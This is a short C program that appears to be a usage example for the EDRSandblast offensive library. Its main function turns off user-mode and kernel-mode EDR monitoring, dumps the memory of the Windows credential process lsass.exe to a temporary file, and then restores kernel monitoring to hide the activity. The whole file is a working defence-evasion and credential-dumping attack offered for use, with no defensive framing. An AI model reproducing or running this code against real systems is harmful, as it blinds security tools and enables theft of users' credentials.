#include "../EDRSandblast_StaticLibrary/EDRSandblast_API.h"
#include <stdio.h>

#pragma comment(lib, "Dbghelp.lib")
#pragma comment(lib, "Version.lib")
#pragma comment(lib, "Winhttp.lib")
#pragma comment(lib, "EDRSandblast_Core.lib")
#pragma comment(lib, "EDRSandblast_StaticLibrary.lib")
#pragma comment(lib, "Pathcch.lib")
#pragma comment(lib, "Shlwapi.lib")


int main()
{
    EDRSB_CONTEXT ctx = { 0 };
    EDRSB_CONFIG cfg = { 0 };
    cfg.bypassMode.Usermode = TRUE;
    cfg.bypassMode.Krnlmode = TRUE;
    cfg.offsetRetrievalMethod.Internet = TRUE;
    cfg.offsetRetrievalMethod.File = TRUE;

    EDRSB_STATUS status;
    if (status = EDRSB_Init(&ctx, &cfg) != EDRSB_SUCCESS) {
        printf("EDRSB_Init: %u", status);
    }
    Usermode_RemoveAllMonitoring(&ctx, EDRSB_UMTECH_Find_and_use_existing_trampoline);
    Krnlmode_RemoveAllMonitoring(&ctx);
    Action_DumpProcessByName(&ctx, L"lsass.exe", L"C:\\temp\\tmp.tmp", EDRSB_UMTECH_Find_and_use_existing_trampoline);
    Krnlmode_RestoreAllMonitoring(&ctx);
    EDRSB_CleanUp(&ctx);
}
